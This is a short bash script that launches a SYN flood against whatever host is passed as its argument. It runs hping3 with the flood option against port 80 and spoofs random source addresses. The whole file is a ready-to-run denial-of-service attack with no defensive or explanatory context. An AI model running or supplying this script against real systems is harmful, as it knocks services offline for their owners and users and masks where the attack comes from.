#!/bin/bash
hping3 -V -p 80 -S --flood --rand-source $1
